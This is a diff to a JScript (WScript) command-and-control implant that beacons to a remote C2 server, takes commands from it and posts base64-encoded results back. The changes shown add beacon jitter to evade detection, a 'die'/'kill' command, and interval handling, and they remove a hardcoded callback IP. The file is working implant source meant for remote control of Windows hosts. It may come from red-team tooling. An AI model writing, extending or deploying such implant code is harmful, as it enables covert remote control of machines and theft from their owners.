@@ -1,4 +1,3 @@
-var LHOST = "192.168.86.122"
 //#######################
 //   GLOBAL VARIABLES
 //#######################
@@ -12,8 +11,8 @@ var contentType = "text/xml";
 var agentid = Math.floor(Math.random() * 99999999).toString();
 
 //Remove hardcoded vars
-agentid = "244633367";
-WScript.Echo(agentid);
+//agentid = "244633367";
+//WScript.Echo(agentid);
 
 var target = c2url + uri;
 var initcmd = "";
@@ -111,13 +110,21 @@ function streamStringToBinary(data) {
 //   MAIN EXECUTION
 //#######################
 var pwd = "c:"
+var running = true
 
-while(true)
+while(running == true)
 {
   var b = '{"type":"b","agentid": ' + agentid +'}';
   var serverMsg = webPost(target, b);
   var jsondata = "{" + serverMsg.split("{")[1]
 
+  //Add Jitter
+  //Jitter mod is based on previous could drift over time...
+  if (Math.floor(Math.random() * 10) % 2 == 0) {
+    beaconTime = beaconTime + (beaconTime * (jitter/100));
+  } else {
+    beaconTime = beaconTime - (beaconTime * (jitter/100));
+  }
 
    //Check for binject
    //if not then go direct
@@ -217,8 +224,8 @@ while(true)
         var mod = jsObject.cmd.slice(4);
 
         if (mod.split(" ")[0] == "interval") {
-          var beaconTime = mod.split(" ")[1]
-          retval = "Modifying implant beaconing interval to: " + mod.split(" ")[1] + "ms"
+          beaconTime = parseInt(mod.split(" ")[1], 10) * 1000
+          retval = "Modifying implant beaconing interval to: " + beaconTime + "ms"
         }
 
       } else if (jsObject.cmd.split(" ")[0] == "show") {
@@ -226,13 +233,19 @@ while(true)
 
         if (mod.split(" ")[0] == "settings") {
           var retval = retval + "Interval: " + beaconTime + "\n";
-          var retval = retval + "Jitter: " + "5s \n";
+          var retval = retval + "Jitter: " + "10% \n";
           var retval = retval + "RHOST: " + LHOST + "\n";
           var retval = retval + "\n";
         }
 
-      } else if (jsObject.cmd == "help") {
-        var retval = "chuck testa";
+      } else if (jsObject.cmd == "die" || jsObject.cmd == "kill") {
+        var running = false;
+
+
+      //Additional Command Templates
+
+
+
       } else if (jsObject.cmd == "help") {
         var retval = "chuck testa";
       } else if (jsObject.cmd == "help") {
@@ -251,7 +264,7 @@ while(true)
       var resp = '{"type":"r","agentid": ' + agentid + ',"taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';
 
       curcmd = jsObject._id;
-      WScript.Echo(resp);
+      //WScript.Echo(beaconTime);
       webPost(target, resp);
     }
   }
@@ -259,5 +272,6 @@ while(true)
   {
      WScript.Sleep(beaconTime);
   }
+  WScript.Echo(beaconTime);
   WScript.Sleep(beaconTime);
 }
